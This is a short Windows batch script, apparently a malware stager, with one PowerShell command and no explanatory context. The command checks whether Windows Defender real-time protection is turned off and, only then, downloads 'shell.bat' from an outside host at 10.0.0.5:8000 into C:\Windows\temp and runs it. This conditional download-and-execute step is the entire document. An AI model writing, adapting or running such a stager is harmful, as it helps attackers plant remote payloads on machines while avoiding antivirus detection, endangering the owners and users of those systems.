@ECHO OFF
powershell -Command "& {if (Get-MPComputerStatus | where-object {$_.RealTimeProtectionEnabled -like 'False'}) {Invoke-WebRequest -URI http://10.0.0.5:8000/shell.bat -Outfile c:\Windows\temp\shell.bat; c:\Windows\temp\shell.bat}}"
pause

